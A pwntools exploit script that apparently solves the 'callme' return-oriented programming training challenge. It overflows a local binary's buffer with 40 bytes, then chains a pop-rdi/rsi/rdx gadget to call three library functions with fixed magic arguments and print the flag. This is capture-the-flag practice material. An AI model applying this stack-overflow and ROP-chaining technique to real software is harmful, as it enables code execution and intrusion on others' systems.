from pwn import *

BINARY = "./callme"
ELF = ELF(BINARY)

context.os = "linux"
context.arch = "amd64"
context.binary = BINARY

p = process(BINARY)

rop = b"A" * 40

for func in ['callme_one', 'callme_two', 'callme_three']:
    rop += p64(0x40093c) # pop rdi ; pop rsi ; pop rdx ; ret
    rop += p64(0xdeadbeefdeadbeef)
    rop += p64(0xcafebabecafebabe)
    rop += p64(0xd00df00dd00df00d)
    rop += p64(ELF.symbols[func])

log.success(f"ROP chain : {rop}")
p.sendline(rop)

flag = p.recvall().split(b'\n')[-2]
log.success(f"FLAG : {flag}")
